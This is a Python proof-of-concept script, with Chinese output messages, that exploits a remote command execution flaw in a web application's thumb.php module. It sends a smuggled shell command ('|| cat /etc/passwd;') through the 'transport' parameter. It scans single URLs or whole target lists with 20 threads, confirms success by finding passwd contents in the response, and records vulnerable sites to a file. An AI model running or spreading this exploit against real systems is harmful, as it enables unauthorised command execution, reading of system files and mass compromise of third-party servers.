import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    }   

def poc(url):
    payload = '/modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=||+cat+%2Fetc%2Fpasswd%3B'
    target = url+payload
    try:
        rsp = requests.get(url=target,verify=False,timeout=5)
        if rsp.status_code == 200:
            if 'bin' in rsp.text and 'nologin' in rsp.text:
                print(f"[+]{url}存在远程命令执行")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
            else:
                print(f"[-]{url}不存在远程命令执行")
        else:
            print(f"[-]{url}不存在远程命令执行")
    except Exception as e:
        print("该站点有问题")

def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
        
if __name__ == '__main__':
    main()